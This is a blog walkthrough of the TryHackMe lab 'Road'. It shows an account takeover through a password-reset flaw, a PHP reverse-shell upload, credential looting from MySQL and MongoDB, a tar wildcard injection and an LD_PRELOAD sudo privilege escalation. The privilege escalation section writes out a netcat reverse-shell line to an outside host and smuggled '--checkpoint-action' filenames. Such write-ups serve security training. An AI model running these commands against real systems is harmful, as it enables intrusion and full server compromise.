---
layout: post
title: TryHackMe Walkthrough - Road
date: 2022-02-12
type: post
tags:
- Walkthrough
- Hacking
- TryHackMe
- Medium
- Machine
permalink: /2022/02/THM/Road
img: 2022/02/Road/Road.png
---

This room of medium difficulty was really fun. You need to exploit vulnerabilities in a web application to gain access to the server. Then you connect to a database to get credentials for a user before exploiting a badly configured sudo.

* Room: Road
* Difficulty: Medium
* URL: [https://tryhackme.com/room/road](https://tryhackme.com/room/road)
* Author: [StillNoob](https://tryhackme.com/p/StillNoob)

There was not much hints for this room. 

> Inspired by a real-world pentesting engagement

> As usual, obtain the user and root flag.

I started the room scanning for opened ports. 

```bash
$ rustscan -a target -- -A  | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.                                                             
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.         
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢
                                                          
[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.148.1:22
Open 10.10.148.1:80                 
[~] Starting Script(s)                                                                                               
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
```

There was only two opened ports, 22 (SSH) and 80 (HTTP).

## Web Exploitation

I opened the web application in a browser. 

![Main Web Site](/assets/images/2022/02/Road/MainSite.png "Main Web Site")

I looked around the site. The 'Track Order' search did not work. It redirected to a 404 page. There was a contact form at the bottom of the page. I used it to submit some data. It got posted to the server, but it did not seems to do anything. 

When I clicked on 'MERCHANT CENTRAL', I was taken to a login screen.

![Login Screen](/assets/images/2022/02/Road/LoginPage.png "Login Screen")

I tried a few standard default credentials. And some simple SQL injection. But that did not work. 

Meanwhile, I ran Gobuster to look for hidden files and folders. 

```bash
gobuster dir -e -u http://target.thm/ -t30 -w /usr/share/dirb/wordlists/common.txt -o gobuster.txt  -xjs,txt,php 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              js,txt,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/02/12 14:52:26 Starting gobuster in directory enumeration mode
===============================================================
http://target.thm/.hta                 (Status: 403) [Size: 275]
http://target.thm/.hta.php             (Status: 403) [Size: 275]
http://target.thm/.hta.js              (Status: 403) [Size: 275]
http://target.thm/.hta.txt             (Status: 403) [Size: 275]
http://target.thm/.htpasswd            (Status: 403) [Size: 275]
http://target.thm/.htaccess            (Status: 403) [Size: 275]
http://target.thm/.htpasswd.js         (Status: 403) [Size: 275]
http://target.thm/.htaccess.js         (Status: 403) [Size: 275]
http://target.thm/.htpasswd.txt        (Status: 403) [Size: 275]
http://target.thm/.htaccess.txt        (Status: 403) [Size: 275]
http://target.thm/.htpasswd.php        (Status: 403) [Size: 275]
http://target.thm/.htaccess.php        (Status: 403) [Size: 275]
http://target.thm/assets               (Status: 301) [Size: 309] [--> http://target.thm/assets/]
http://target.thm/index.html           (Status: 200) [Size: 19607]                              
http://target.thm/phpMyAdmin           (Status: 301) [Size: 313] [--> http://target.thm/phpMyAdmin/]
http://target.thm/server-status        (Status: 403) [Size: 275]                                    
http://target.thm/v2                   (Status: 301) [Size: 305] [--> http://target.thm/v2/]        
                                                                                                    
===============================================================
2022/02/12 14:54:58 Finished
===============================================================
```

The site had an available installation of [phpMyAdmin](https://www.phpmyadmin.net/ "phpMyAdmin"). But I needed some credentials to use it. 

The `assets` folder contained static files. 

I ran Gobuster on the `v2` and `v2/admin` folders. It found a few PHP files, but nothing I could use immediately. 

```bash
gobuster dir -e -u http://target.thm/v2/ -t30 -w /usr/share/dirb/wordlists/common.txt  -xjs,txt,php                                                                                         
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm/v2/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,js,txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/02/12 15:07:11 Starting gobuster in directory enumeration mode
===============================================================
...
http://target.thm/v2/admin                (Status: 301) [Size: 311] [--> http://target.thm/v2/admin/]
http://target.thm/v2/index.php            (Status: 302) [Size: 20178] [--> /v2/admin/login.html]     
http://target.thm/v2/index.php            (Status: 302) [Size: 20178] [--> /v2/admin/login.html]     
http://target.thm/v2/lostpassword.php     (Status: 200) [Size: 22]                                   
http://target.thm/v2/profile.php          (Status: 302) [Size: 26751] [--> /v2/admin/login.html]     
                                                                                                     
===============================================================
2022/02/12 15:09:54 Finished
===============================================================

$ gobuster dir -e -u http://target.thm/v2/admin/ -t30 -w /usr/share/dirb/wordlists/common.txt  -xjs,txt,php 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://target.thm/v2/admin/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              js,txt,php
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/02/12 15:11:13 Starting gobuster in directory enumeration mode
===============================================================
...
http://target.thm/v2/admin/index.php            (Status: 200) [Size: 32] 
http://target.thm/v2/admin/index.php            (Status: 200) [Size: 32] 
http://target.thm/v2/admin/logout.php           (Status: 302) [Size: 0] [--> login.html]
http://target.thm/v2/admin/reg.php              (Status: 200) [Size: 28]                
                                                                                        
===============================================================
2022/02/12 15:14:04 Finished
===============================================================
```

I went back to the web site. But login page had a link to register. I used it to create an account on the site. And then I logged in.

![Merchant Dashboard](/assets/images/2022/02/Road/MerchantDashboard.png "Merchant Dashboard")

I explored the dashboard. Most links didn't do anything. 

The 'Reset User' link allowed to change my password. When I looked at the data that was posted, I saw that it sent the username. 

```http
POST /v2/lostpassword.php HTTP/1.1
Host: target.thm
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------28291612228215906952274292276
Content-Length: 650
Origin: http://target.thm
Connection: close
Referer: http://target.thm/v2/ResetUser.php
Cookie: PHPSESSID=tqfqnqc5k6jn27qi1c4928c3ep; Bookings=0; Manifest=0; Pickup=0; Delivered=0; Delay=0; CODINR=0; POD=0; cu=0
Upgrade-Insecure-Requests: 1

-----------------------------28291612228215906952274292276
Content-Disposition: form-data; name="uname"

test@test.com
-----------------------------28291612228215906952274292276
Content-Disposition: form-data; name="npass"

123456
-----------------------------28291612228215906952274292276
Content-Disposition: form-data; name="cpass"

123456
-----------------------------28291612228215906952274292276
Content-Disposition: form-data; name="ci_csrf_token"


-----------------------------28291612228215906952274292276
Content-Disposition: form-data; name="send"

Submit
-----------------------------28291612228215906952274292276--
```


I used Burp to intercept the requests and change the usename to modify someone else password. But it always returned a success, no matter the username I used. So without knowing the admin username I could not do anything with this.

The search form took me to a page that said the feature was not working before taking me back to the dashboard. 

> Due to huge amount of complaints, we are currently working on fixing this. Sorry for the inconvenience.

Next, I opened the profile page. 

![Profile Page](/assets/images/2022/02/Road/ProfilePage.png "Profile Page")

This page contained a bunch of profile fields that I could not modify. There was a button to upload a profile image, and a message that said that only admins could used this feature. 

> Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes. 

I could not use the feature, but I had something that looked like the admin user name. I went back to the page to change my password to 123456. I intercepted the POST request and change the username to 'admin@sky.thm'. I logged out, and tried to login with admin@sky.thm/123456 and it worked. I was logged in as an admin.

As the admin user, I went back to the profile page and tried to upload an image. The upload seemed to work. There was a message that said the image was saved. But it did not say where. The profile image was not changed. And I did not see the new image in `/assets/img`. 

I took a closer look at the page HTML and saw this comment.

```html
<!-- /v2/profileimages/ -->
```

I navigated to http://target.thm/v2/profileimages/ but directory listing was disabled. I added the name of the image I just uploaded and it worked. 

Next I tried to upload a PHP reverse shell. There was no restriction on what I could upload so the upload was successful. I launched a netcat listener and opened http://target.thm/v2/profileimages/php-reverse-shell.php, it gave me a reverse shell. 

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.47.241 49698
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 21:09:12 up  1:23,  0 users,  load average: 0.27, 0.10, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

## Privilege Escalation

I started by getting a stable bash shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'; export TERM=xterm
CTRL-z
stty raw -echo;fg
```

Then I explored the server. 

```bash
www-data@sky:/$ ls -la /home
total 12
drwxr-xr-x  3 root         root         4096 May 25  2021 .
drwxr-xr-x 20 root         root         4096 May 25  2021 ..
drwxr-xr-x  4 webdeveloper webdeveloper 4096 Oct  8 10:59 webdeveloper

www-data@sky:/$ ls -la /home/webdeveloper
total 36
drwxr-xr-x 4 webdeveloper webdeveloper 4096 Oct  8 10:59 .
drwxr-xr-x 3 root         root         4096 May 25  2021 ..
lrwxrwxrwx 1 webdeveloper webdeveloper    9 May 25  2021 .bash_history -> /dev/null
-rw-r--r-- 1 webdeveloper webdeveloper  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 webdeveloper webdeveloper 3771 Feb 25  2020 .bashrc
drwx------ 2 webdeveloper webdeveloper 4096 May 25  2021 .cache
drwxrwxr-x 3 webdeveloper webdeveloper 4096 May 25  2021 .local
-rw------- 1 webdeveloper webdeveloper   51 Oct  8 10:59 .mysql_history
-rw-r--r-- 1 webdeveloper webdeveloper  807 Feb 25  2020 .profile
-rw-r--r-- 1 webdeveloper webdeveloper    0 Oct  7 17:53 .sudo_as_admin_successful
-rw-r--r-- 1 webdeveloper webdeveloper   33 May 25  2021 user.txt

www-data@sky:/$ cat /home/webdeveloper/user.txt
REDACTED
```

I had my first flag. But I could not read the other files in webdeveloper's home directory.

I looked in the `/var/www/html` folder and found multiple files with the database credentials. 

```php
$con = mysqli_connect('localhost','root','REDACTED');
$db = mysqli_select_db($con, 'SKY');
```

I tried to use the password to su as webdeveloper and root. But the password failed. 

I then connected to the database. 

```bash
www-data@sky:/$ mysql -u root -pREDACTED
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
```

```sql
mysql> Show Databases;
+--------------------+
| Database           |
+--------------------+
| SKY                |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use SKY;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> Show Tables;
+---------------+
| Tables_in_SKY |
+---------------+
| Users         |
+---------------+
1 row in set (0.00 sec)

mysql> Select * From Users;
+----+---------------+----------+------------+
| id | username      | password | phone      |
+----+---------------+----------+------------+
|  2 | admin@sky.thm | 123456   | 5486214569 |
|  7 | test@test.com | 123456   | 5555555555 |
+----+---------------+----------+------------+
2 rows in set (0.00 sec)
```

The admin password was the one I changed. I tried the phone number as a password, but that failed. There was nothing else of interest in the database. 

I looked for files that were owned by www-data and did not see anything I could use. I tried the same thing for webdeveloper. 

```bash
www-data@sky:/tmp$ find / -user webdeveloper 2>/dev/null        
/home/webdeveloper
/home/webdeveloper/.bashrc
/home/webdeveloper/.mysql_history
/home/webdeveloper/.local
/home/webdeveloper/.local/share
/home/webdeveloper/.sudo_as_admin_successful
/home/webdeveloper/.bash_logout
/home/webdeveloper/.cache
/home/webdeveloper/.bash_history
/home/webdeveloper/.profile
/home/webdeveloper/user.txt
/usr/bin/mongoimport
/usr/bin/mongostat
/usr/bin/mongofiles
/usr/bin/mongorestore
/usr/bin/mongodump
/usr/bin/bsondump
/usr/bin/mongotop
/usr/bin/mongoexport
/usr/share/doc/mongodb-database-tools
/usr/share/doc/mongodb-database-tools/README.md
/usr/share/doc/mongodb-database-tools/LICENSE.md
/usr/share/doc/mongodb-database-tools/THIRD-PARTY-NOTICES
```

There was a few files with mongo in their name. So I tried connecting to a mongo database. 

```bash
$ mongo

> show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB

> use admin
switched to db admin

> show collections;
system.version

> use backup
switched to db backup

> show collections;
collection
user

> db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "REDACTED" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
```

I used the found password to su as webdeveloper and it worked. I reconnected with SSH to get a better shell. 

## Getting root

I looked for any sudo permissions webdeveloper might have. 

```bash
webdeveloper@sky:~$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility

webdeveloper@sky:~$ ls -la /usr/bin/sky_backup_utility
-rwxr-xr-x 1 root root 16704 Aug  7  2021 /usr/bin/sky_backup_utility

webdeveloper@sky:~$ file /usr/bin/sky_backup_utility
/usr/bin/sky_backup_utility: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e1edd422e86d9c4cdb136d11a2dfbda966aa326d, for GNU/Linux 3.2.0, not stripped
```

They were able to run a backup utility as any user. The file was not writeable, so I could not change it. 

I ran strings on the executable. 

```bash
webdeveloper@sky:~$ strings /usr/bin/sky_backup_utility | less

/lib64/ld-linux-x86-64.so.2
puts
printf
system
...
Sky Backup Utility
Now attempting to backup Sky
tar -czvf /root/.backup/sky-backup.tar.gz /var/www/html/*
Backup failed!
Check your permissions!
Backup successful!
...
```

When I saw the tar command with a wildcard at the end, I tought I could use the same [technique I used in the past](https://erichogue.ca/2021/06/VulnNet). 

I reconnected as www-data to be able to write in `/var/www/html`. 

```bash
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.47.241 49964
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 22:02:15 up  2:16,  1 user,  load average: 0.00, 0.02, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
webdevel pts/2    10.13.3.36       21:54   54.00s  0.06s  0.06s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ cd /var/www/html

$ echo "mkfifo /tmp/kirxhbg; nc 10.13.3.36 4445 0</tmp/kirxhbg | /bin/sh >/tmp/kirxhbg 2>&1; rm /tmp/kirxhbg" > shell.sh

$ echo "" > "--checkpoint-action=exec=sh /var/www/html/shell.sh"

$ echo "" > --checkpoint=1
```

I launched a netcat listener and ran the backup script. I did not get the reverse shell. When I ran the tar command as webdeveloper, the reverse shell worked. But it failed when called from the backup binary. 

I next tried to create a tar command in the home folder. I hoped to have it used instead of the real tar. But since I was not allowed to change the PATH variable, that also failed. 

I took another look at the sudo permission and saw that part: `env_keep+=LD_PRELOAD`. I searched for what LD_PRELOAD is. It allowed passing shared libraries that would be loaded when the program start. 

I found a [great post on using LD_PRELOAD to escalate privileges](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/). I used the provided code to get root.

```bash
webdeveloper@sky:~$ cd /tmp
webdeveloper@sky:/tmp$ vim shell.c
webdeveloper@sky:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
shell.c: In function ‘_init’:
shell.c:6:2: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    6 |  setgid(0);
      |  ^~~~~~
shell.c:7:2: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    7 |  setuid(0);
      |  ^~~~~~
webdeveloper@sky:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
# whoami
root
# ls /root
root.txt
# cat /root/root.txt
REDACTED
# 
```

I enjoyed this room. I liked that I had to use two different web vulnerabilities to gain the shell. And I learned a new privilege escalation technique with the backup binary. 
